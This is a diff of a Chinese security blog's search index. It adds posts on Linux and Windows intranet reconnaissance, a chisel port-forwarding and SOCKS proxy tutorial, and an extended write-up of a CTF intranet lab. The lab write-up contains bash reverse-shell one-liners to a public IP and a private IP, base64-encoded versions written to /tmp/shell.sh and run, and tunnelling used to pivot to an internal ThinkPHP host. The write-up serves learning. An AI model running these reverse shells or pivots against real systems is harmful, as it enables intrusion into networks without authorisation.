@@ -4,11 +4,53 @@
   
     
     <entry>
+      <title>Linux信息搜集</title>
+      <link href="/2025/06/17/Linux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
+      <url>/2025/06/17/Linux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="获取操作系统基本信息"><a href="#获取操作系统基本信息" class="headerlink" title="获取操作系统基本信息"></a>获取操作系统基本信息</h2><p><img src="/../images/image-20250617163301536.png" alt="image-20250617163301536"></p><h2 id="获取系统环境信息"><a href="#获取系统环境信息" class="headerlink" title="获取系统环境信息"></a>获取系统环境信息</h2><p><img src="/../images/image-20250617163700805.png" alt="image-20250617163700805"></p><p>##获取系统服务信息</p><p><img src="/../images/image-20250617163823513.png" alt="image-20250617163823513"></p><h2 id="获取软件配置信息"><a href="#获取软件配置信息" class="headerlink" title="获取软件配置信息"></a>获取软件配置信息</h2><p><img src="/../images/image-20250617164159425.png" alt="image-20250617164159425"></p><h2 id="获取系统任务和作业"><a href="#获取系统任务和作业" class="headerlink" title="获取系统任务和作业"></a>获取系统任务和作业</h2><p><img src="/../images/image-20250617164415856.png" alt="image-20250617164415856"></p><h2 id="获取用户信息和组信息"><a href="#获取用户信息和组信息" class="headerlink" title="获取用户信息和组信息"></a>获取用户信息和组信息</h2><p><img src="/../images/image-20250617164737796.png" alt="image-20250617164737796"></p><h2 id="获取用户和权限信息"><a href="#获取用户和权限信息" class="headerlink" title="获取用户和权限信息"></a>获取用户和权限信息</h2><p><img src="/../images/image-20250617170252591.png" alt="image-20250617170252591"></p><h2 id="获取网络信息"><a href="#获取网络信息" class="headerlink" title="获取网络信息"></a>获取网络信息</h2><p><img src="/../images/image-20250617170510955.png" alt="image-20250617170510955"></p><p>##获取其他信息</p><p><img src="/../images/image-20250617171442767.png" alt="image-20250617171442767"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux信息搜集 </tag>
+            
+            <tag> 内网信息搜集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>windwos信息搜集</title>
+      <link href="/2025/06/17/windwos%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
+      <url>/2025/06/17/windwos%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h2 id="常用域命令"><a href="#常用域命令" class="headerlink" title="常用域命令"></a>常用域命令</h2><p><img src="/../images/image-20250617154434140.png" alt="image-20250617154434140"></p><h2 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h2><p>###psloggedon</p><p><img src="/../images/image-20250617154609922.png" alt="image-20250617154609922"></p><h3 id="netview"><a href="#netview" class="headerlink" title="netview"></a>netview</h3><p><img src="/../images/image-20250617154654876.png" alt="image-20250617154654876"></p><h2 id="查找域管理进程"><a href="#查找域管理进程" class="headerlink" title="查找域管理进程"></a>查找域管理进程</h2><p><img src="/../images/image-20250617154845164.png" alt="image-20250617154845164"></p><p><img src="/../images/image-20250617154925180.png" alt="image-20250617154925180"></p><p>![image-20250617154942429](..&#x2F;images&#x2F;image-20250617154942429.png</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 内网信息搜集 </tag>
+            
+            <tag> windwos信息搜集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>chisel的使用</title>
       <link href="/2025/06/08/chisel%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
       <url>/2025/06/08/chisel%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p><img src="https://picx.zhimg.com/v2-040ea186715bb89ef0245389a1c3cf41_r.jpg" alt="img"></p><p>程序只有一个二进制文件，客户端和服务端都包含在其中，通过给定参数<code>chisel &lt;client|server&gt;</code>运行客户端或服务端。添加<code>--help</code>参数即可看到对应的帮助文档。</p><p>下面用kali和win11主机做演示：</p><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>首先在kali上<code>python3 -m http.server --blind 127.0.0.1:8000</code>启动一个http服务，并且该服务只对本地8000端口开放</p><p>那么为了在win11主机上能访问到这个http服务，我们就需要做端口转发，这是比较经典的场景。</p><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h2><p>kali上执行 <code>chisel server -p 1234</code></p><p>win11上执行 <code>chisel.exe client 192.168.226.128(kali的IP):1234 11111:127.0.0.1:8000</code></p><p>这时我们就将kali的<code>8000</code>端口转发到win10的<code>11111</code>端口上了，此时在win11上就可以访问</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>kali上执行： <code>./chisel client 192.168.69.44(win11的IP):1234 R:11111:127.0.0.1:8000</code></p><p>win11上执行：<code>chisel.exe server -p 1234 --reverse</code></p><p>这样就可以完成了反向连接的端口转发</p><h2 id="socks5代理"><a href="#socks5代理" class="headerlink" title="socks5代理"></a>socks5代理</h2><h3 id="正向连接-1"><a href="#正向连接-1" class="headerlink" title="正向连接"></a>正向连接</h3><p>win11上执行： <code>chisel.exe server -p 1234</code></p><p>kali执行<code>./chisel client 192.168.69.44(win11 IP):1234 socks</code></p><p>然后我们使用浏览器代理工具配置socks5代理就可以访问内网了</p><h3 id="反向连接-1"><a href="#反向连接-1" class="headerlink" title="反向连接"></a>反向连接</h3><p>kali执行 <code>./chisel* server -p 1234 --reverse</code></p><p>win11上执行 <code>chisel.exe client 192.168.226.128(kali IP):1234 R:socks</code> </p>]]></content>
       
       
       
@@ -17,6 +59,8 @@
             <tag> 内网 </tag>
             
             <tag> 代理工具 </tag>
+            
+            <tag> chisel </tag>
             
         </tags>
       
@@ -29,7 +73,7 @@
       <link href="/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/"/>
       <url>/2025/06/06/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/</url>
       
-        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://github.com/CTF-Archives/Puff-Pastry">https://github.com/CTF-Archives/Puff-Pastry</a></p><p>网络拓扑图：</p><img src="../images/image-20250606175402519.png" alt="image-20250606175402519" style="zoom:80%;" /><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p><img src="/../images/image-20250606175422906.png" alt="image-20250606175422906"></p><p>一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用<code>Shiro反序列化利用工具</code>直接打</p><p><img src="/../images/image-20250606175538502.png" alt="image-20250606175538502"></p><p>可以执行命令了<code>cat /flag.txt</code></p><p><code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>先反弹shell吧</p><p>反弹shell命令base64编码一下</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.133.198.27&#x2F;1122 0&gt;&amp;1*</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMy4xOTguMjcvMTEyMiAwPiYx | base64 -d &gt; /tmp/shell.sh</span><br><span class="line"> chmod +x /tmp/shell.sh</span><br><span class="line"> ls -lh /tmp/shell.sh</span><br><span class="line"> /bin/bash /tmp/shell.sh</span><br></pre></td></tr></table></figure><p>然后下载一下fscan扫描内网</p><p>扫描之后发现<code>192.168.100.2/24</code>这个网段有两台机器有问题：</p><p><del>192.168.100.2 shiro反序列化 已经拿下</del></p><p><em>192.168.100.3 thinkphp  未拿下</em></p><p>这个机器是在内网，所以我们需要搭建代理隧道</p><p>a</p>]]></content>
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场地址：<a href="https://github.com/CTF-Archives/Puff-Pastry">https://github.com/CTF-Archives/Puff-Pastry</a></p><p>网络拓扑图：</p><img src="../images/image-20250606175402519.png" alt="image-20250606175402519" style="zoom:80%;" /><h2 id="Shiro-flag01"><a href="#Shiro-flag01" class="headerlink" title="Shiro flag01"></a>Shiro flag01</h2><p><img src="/../images/image-20250606175422906.png" alt="image-20250606175422906"></p><p>一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用<code>Shiro反序列化利用工具</code>直接打</p><p><img src="/../images/image-20250606175538502.png" alt="image-20250606175538502"></p><p>可以执行命令了<code>cat /flag.txt</code></p><p><code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p><p>##Thinkphp flag02</p><p>先反弹shell吧</p><p>反弹shell命令base64编码一下</p><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;8.133.198.27&#x2F;1122 0&gt;&amp;1*</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzMy4xOTguMjcvMTEyMiAwPiYx | base64 -d &gt; /tmp/shell.sh</span><br><span class="line"> chmod +x /tmp/shell.sh</span><br><span class="line"> ls -lh /tmp/shell.sh</span><br><span class="line"> /bin/bash /tmp/shell.sh</span><br></pre></td></tr></table></figure><p>然后下载一下fscan扫描内网</p><p>扫描之后发现<code>192.168.100.2/24</code>这个网段有两台机器有问题：</p><p><del>192.168.100.2 shiro反序列化 已经拿下</del></p><p><em>192.168.100.3 thinkphp  未拿下</em></p><p>这个机器是在内网，所以我们需要搭建代理隧道</p><p>###搭建代理</p><p>使用chisel端口转发，先下载<code>chisel</code></p><p>使用反向连接</p><p>shiro机器上执行 <code>./chisel* client 192.168.69.44:2003 R:0.0.0.0:10001:192.168.100.3:80</code></p><p>win11: <code>chisel.exe server -p 2003 --reverse</code></p><p>使用thinkphp扫描工具</p><p><img src="/../images/image-20250610164436181.png" alt="image-20250610164436181"></p><p>拿flag</p><p> <code>WSS-Studio&#123;ThinkPHP-84d786a4-b47c-4fcb-a377-be6241d5bf10&#125;</code></p><p>发送DNS请求，发现该机器可以出网，那么就可以反弹shell</p><h3 id="反弹thinkphp-shell"><a href="#反弹thinkphp-shell" class="headerlink" title="反弹thinkphp shell"></a>反弹thinkphp shell</h3><blockquote><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.226.128&#x2F;1234 0&gt;&amp;1</p></blockquote><p><code>echo  YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNi4xMjgvMTIzNCAwPiYx | base64 -d &gt; /tmp/shell.sh</code></p>]]></content>
       
       
       
@@ -74,25 +118,6 @@
         <tags>
             
             <tag> HelloCTF RCE </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>CTFSHOW-Laravel专题</title>
-      <link href="/2025/05/23/Laravel/"/>
-      <url>/2025/05/23/Laravel/</url>
-      
-        <content type="html"><![CDATA[<h2 id="介绍Laravel"><a href="#介绍Laravel" class="headerlink" title="介绍Laravel"></a>介绍Laravel</h2><p>Laravel 是一个基于 <strong>PHP</strong> 的现代 Web 应用框架，以其 <strong>优雅的语法</strong>、<strong>强大的功能</strong> 和 <strong>开发效率高</strong> 而受到广泛欢迎。它遵循 <strong>MVC（Model-View-Controller）</strong> 架构模式，适合开发从小型网站到大型企业级应用的各种项目。</p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> Laravel </tag>
             
         </tags>
       
